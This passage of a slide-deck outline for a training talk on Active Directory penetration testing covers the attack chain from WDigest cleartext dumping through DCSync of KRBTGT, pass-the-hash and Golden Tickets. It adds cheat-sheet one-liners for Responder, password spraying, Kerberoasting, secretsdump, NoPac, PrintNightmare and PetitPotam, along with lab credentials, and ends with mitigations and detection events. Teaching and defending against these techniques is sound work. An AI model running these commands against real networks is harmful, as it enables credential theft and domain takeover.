**Speaker notes:** SYSTEM lets us dump SAM. Mimikatz kiwi lsa_dump_sam gives us the local admin NT hash. We pass-the-hash back to MS01 — same gold image, same hash. From here we can RDP and run Mimikatz against any logged-on domain user. From §6.

---
### Slide 48 — Phase 7: WDigest → Cleartext
**Visual:** code: `reg add ... WDigest /v UseLogonCredential /t REG_DWORD /d 1`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Re-enable **WDigest** via registry
- Force reboot — re-logons store cleartext
- `mimikatz sekurlsa::logonpasswords`
- Found `tpetty:Sup3rS3cur3D0m@inU2eR`
- Lucky: tpetty has hidden ACL rights

**Speaker notes:** WDigest used to store cleartext passwords in LSASS. Disabled by default since 2014, but a registry flip re-enables it. Force a reboot, wait for users to log back in, dump LSASS, and we get cleartext passwords for everyone. tpetty falls — and unbeknownst to anyone, tpetty has DCSync rights. From §6.

---
### Slide 49 — Phase 8: ACL Discovery
**Visual:** code: `Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Map outbound ACLs from every controlled SID
- AMSI-blocked? Use **bloodhound-python** Linux
- `tpetty` → DCSync rights
- `CT059` → GenericAll on Domain Admins
- **Two parallel paths to DA**

**Speaker notes:** Two ways to do this — PowerView on Windows or bloodhound-python from Linux when AMSI blocks the upload. Both reveal two paths: tpetty has the replication ACEs (DCSync directly), and separately CT059 has GenericAll on Domain Admins (write yourself in). Either works. From §6.

---
### Slide 50 — Phase 9: DCSync to KRBTGT
**Visual:** code: `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `runas /user:INLANEFREIGHT\tpetty powershell`
- Mimikatz `lsadump::dcsync`
- Pulled administrator + **KRBTGT** NTLM
- Alt path: `net rpc group addmem` then secretsdump
- Domain ownership achieved

**Speaker notes:** runas as tpetty, fire mimikatz, DCSync the administrator account and KRBTGT. We now have the KRBTGT hash — the kingdom key — and the built-in admin NTLM. Alternative path used CT059 to add itself to Domain Admins, then secretsdump. Either way, the domain is ours. From §6.

---
### Slide 51 — Phase 10: Pivot, Loot, Persist
**Visual:** code: `evil-winrm -i 127.0.0.1 --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `netsh portproxy` to reach DC
- Pass-the-hash administrator → **DC01**
- KRBTGT enables **Golden Ticket persistence**
- Forest trust? ExtraSid → **Enterprise Admin**
- Engagement complete

**Speaker notes:** Final phase: portproxy through a reachable host to talk to DC01, pass-the-hash administrator, grab the flag. With KRBTGT in hand persistence is trivial — forge a Golden Ticket valid for 10 years. If a forest trust exists, the ExtraSids technique from §5 takes us to Enterprise Admin. From §6.

---
### Slide 52 — Section 6.5: Hands-On Live Labs
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 6.5 — switch to terminal
- Two full chains, **step-by-step in vault**
- Foundational HTB boxes for warm-up
- Run live, or share QR after talk
- Source: `ad-enum-attacks/skills-assessment-part*.md`

**Speaker notes:** Theory is done. Pull up a terminal — the next three slides are the labs. Each one already has every command typed out in the vault, so the audience can follow along live or scan a QR after the talk. Pick **one** to demo on stage; leave the rest as homework. Decide ahead of time which lab fits the room: junior pentesters love the LLMNR start of Lab 2; SOC analysts get more out of the Kerberoast → DCSync chain in Lab 1.

---
### Slide 53 — Live Lab #1: Web Shell → Kerberoast → DCSync
**Visual:** text only — file path: `ad-enum-attacks/skills-assessment-part1.md`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Foothold: web shell at `/uploads`
- Kerberoast `svc_sql` → crack `lucky7`
- Lateral PtH → MS01 → **WDigest dump**
- `tpetty` has DCSync rights
- Final flag: `r3plicat1on_m@st3r!`

**Analogy:** Picture the chain as a **lockpicker's relay race**: web shell hands the baton to Kerberoast, Kerberoast hands it to lateral movement, lateral movement hands it to WDigest's chalkboard of plaintext PINs, and the last runner crosses the finish line by phoning HQ pretending to be a satellite office (DCSync).

**Speaker notes:** The full step-by-step lives in `ad-enum-attacks/skills-assessment-part1.md` — every command, every flag, every gotcha. **Eight questions, one chain:** Q1 grab a flag from the web shell, Q2 enumerate SPNs (`setspn -Q */*`), Q3 crack with hashcat mode 13100, Q4 lateral with `evil-winrm`, Q5/Q6 dump WDigest plaintext via Mimikatz, Q7 enumerate ACLs to find DCSync rights, Q8 finish with `lsadump::dcsync`. Pacing: ~25 minutes if everything works. **Pre-stage:** payload, listener, hashcat wordlist all ready before going on stage — never live-debug a payload generation in front of a CISO.

---
### Slide 54 — Live Lab #2: Full Chain — LLMNR → Domain Compromise
**Visual:** text only — file path: `ad-enum-attacks/skills-assessment-part2.md`

**Bullets** (max 5, ≤12 words each, no full sentences):
- 12 questions, 10 attack phases
- Responder → spray → SQL → SeImpersonate
- AMSI block → **pivot to Linux tools**
- `bloodhound-python` finds GenericAll
- KRBTGT hash via `secretsdump.py`

**Analogy:** This one's the **full guided tour** of the heist movie from Slide 13. You walk in with no creds, walk out with the master key cabinet. Every act of the heist is a separate question.

**Speaker notes:** Walkthrough at `ad-enum-attacks/skills-assessment-part2.md`. The lab is the **single best demonstration** of why Linux tradecraft matters in modern AD: AMSI silently kills PowerView mid-engagement, and the lab forces a clean pivot — `bloodhound-python` instead of SharpHound, `net rpc group addmem` instead of `Add-DomainGroupMember`, `secretsdump.py` instead of Mimikatz. **Demo tip:** if you only have 10 minutes, skip Phases 1–4 (already covered in §6 walkthrough slides) and start the live demo at Phase 7 — the ACL discovery and `net rpc` finisher land hardest with an audience because they see the **graph win** in BloodHound and the **one-line win** in net rpc back-to-back.

---
### Slide 55 — Foundational Practice Boxes (HTB)
**Visual:** table: Box → Difficulty → Headline technique → Why pick it

**Bullets** (max 5, ≤12 words each, no full sentences):
- **Forest** — Easy — AS-REP roast → DCSync
- **Active** — Easy — GPP cpassword → Kerberoast
- **Sauna** — Easy — AS-REP roast → AutoLogon
- **Blackfield** — Hard — AS-REP → ACL → Shadow Creds
- **Reel** — Hard — Phishing → Kerberos → DCSync

**Analogy:** Treat these like **a pianist's scales**. Forest is your C-major: every CPTS-tier operator can play it from memory. Run them in order — each box adds one new "note" to your repertoire (AS-REP, GPP, ACL chain, certificate abuse). Don't skip to the hard ones; the hard ones assume you've automated the easy ones.

**Speaker notes:** All five are HTB boxes most pentesters know by name. **Forest** is the canonical "first AD box" — the AS-REP roast → BloodHound → DCSync chain on Forest is what the lab in §6 is built to mirror. **Active** teaches you to find `Groups.xml` cpassword in SYSVOL — a real-world misconfig you will see in actual engagements. **Blackfield** is the bridge to Certified-Pre-Owned territory (Shadow Credentials, AD CS abuse). 0xdf has public walkthroughs on all of them — link them in the QR handout. **Demo only one live**; mention the rest as homework. Source: `ad-enum-attacks/36-beyond-this-module.md`.

---
### Slide 56 — Section 7: Cheat Sheet
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 7

**Speaker notes:** Section divider. The next three slides are the operator's cheat sheet, grouped by kill-chain phase. Print these out for your engagement clipboard.

---
### Slide 57 — Cheat Sheet: Recon & Foothold
**Visual:** table: Cheat sheet rows for poison, OSINT, sweep, kerbrute, policy, spray (Linux/Windows), local-admin spray

**Bullets** (max 5, ≤12 words each, no full sentences):
- LLMNR poison: `sudo responder -I ens224`
- Sweep: `fping -asgq 172.16.5.0/23`
- User enum: `kerbrute userenum`
- Spray: `cme smb DC -u users.txt -p Welcome1`
- Local hash spray: `cme --local-auth`

**Speaker notes:** First eight rows of the cheat sheet — everything from L2 access to a working credential. Memorise these one-liners. Note the MITRE column on the source table; clients love seeing T1557.001 next to your finding. From §7.

---
### Slide 58 — Cheat Sheet: Enum & Escalate
**Visual:** table: Cheat sheet rows for BloodHound, Snaffler, LOTL, Kerberoast, ACL, DCSync, lateral, SQL

**Bullets** (max 5, ≤12 words each, no full sentences):
- BloodHound: `bloodhound-python -c all`
- Snaffler: `Snaffler.exe -d DOM -s -v data`
- Kerberoast: `Rubeus.exe kerberoast /ldapfilter:'admincount=1'`
- ACL: `Get-DomainObjectACL -ResolveGUIDs`
- DCSync: `secretsdump.py -just-dc DOM/U@DC`

**Speaker notes:** The middle of the kill chain — credentialed enumeration through to DCSync. BloodHound first, always. Snaffler for share creds. Rubeus for Kerberoasting on Windows, GetUserSPNs.py on Linux. The DCSync one-liner is your finishing move. From §7.

---
### Slide 59 — Cheat Sheet: CVEs, Trusts, PtH
**Visual:** table: Cheat sheet rows for NoPac, PrintNightmare, PetitPotam, trust enum, ExtraSids, raiseChild, cross-forest roast, PtH/PtT

**Bullets** (max 5, ≤12 words each, no full sentences):
- NoPac: `noPac.py DOM/U:P -dc-ip DC -shell`
- PrintNightmare: `CVE-2021-1675.py ... evil.dll`
- PetitPotam: `PetitPotam.py US DC` + relay
- ExtraSids: `ticketer.py -extra-sid PSID-519`
- PtH: `evil-winrm -u administrator -H NT`

**Speaker notes:** End-game one-liners. The three CVE escalations, the trust abuse pair, and the credential-replay duo (pass-the-hash and pass-the-ticket). raiseChild.py is the auto-pwn for child-to-parent — single command, one line, Enterprise Admin. From §7.

---
### Slide 60 — Section 8: Defenses
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 8

**Speaker notes:** Section divider. We've spent the deck attacking. Now the headline mitigations — what you tell the client to fix.

---
### Slide 61 — Defense Headlines
**Visual:** table: TTP / MITRE / Defence from §5 hardening

**Bullets** (max 5, ≤12 words each, no full sentences):
- Disable LLMNR + NBT-NS via **GPO**
- Enforce **SMB signing** + LDAP signing
- **gMSA** for service accts; AES-only Kerberos
- LAPS + tier-0 isolation; **MAQ=0**
- Rotate **KRBTGT 2x**, deploy **Protected Users**

**Speaker notes:** These five lines fix 80% of the attack surface in this deck. Disabling LLMNR alone kills the easiest foothold. SMB signing blocks NTLM relay. gMSA kills Kerberoasting. LAPS kills lateral via local admin reuse. Setting machine account quota to zero kills NoPac. KRBTGT rotation invalidates Golden Tickets. From §8.

---
### Slide 62 — Detection Quick Reference
**Visual:** table: Attack / Detection event / Mitigation from §8

**Bullets** (max 5, ≤12 words each, no full sentences):
- 4625 / 4771 burst → **spray**
- 4769 RC4 burst → **Kerberoast**
- 4662 replication GUID → **DCSync**
- 5136 → **ACL chain abuse**
- 4724 / 4728 → privileged resets / additions

**Speaker notes:** Map the noisiest events to the attack that produces them. SOC analyst's cheat sheet. The 4769 with enctype 0x17 (RC4) is the best Kerberoasting tell — modern clients use AES, so RC4 is a strong signal. 4662 with the replication property GUID from a non-DC source IP is the DCSync smoking gun. From §8.

---
### Slide 63 — Key Takeaways
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Forest = **true** security boundary
- KRBTGT hash = **kingdom key**
- BloodHound is your brain — use it first
- Most "attacks" are **feature abuse**
- Chain knowledge > single-CVE knowledge

**Speaker notes:** Five things to walk away with. Forest, not domain, is the boundary that matters. KRBTGT is the single most valuable secret. BloodHound replaces hours of manual graph-walking. Almost nothing here is a CVE — it's Kerberos, ACLs, and weak passwords. And understanding the chain — not any single attack — is what makes you CPTS-tier. From §1 + §9.

---
### Slide 64 — Q&A / References
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Questions?
- HTB practice: Forest, Active, Reel, Blackfield
- Read: SpecterOps, harmj0y, **adsecurity.org**
- Talks: *Six Degrees of Domain Admin*
- Source notes in `ad-enum-attacks/`

**Speaker notes:** Open the floor. If you want to practise, hit Forest, Active, Reel, Mantis, Blackfield, Monteverde on HTB, then the Zephyr track, then Pro Labs Dante and Offshore. Required reading: SpecterOps blog, harmj0y archive, Sean Metcalf at adsecurity.org, Dirk-jan Mollema at dirkjanm.io. The original Kerberoasting talk by Tim Medin is mandatory. From §9.
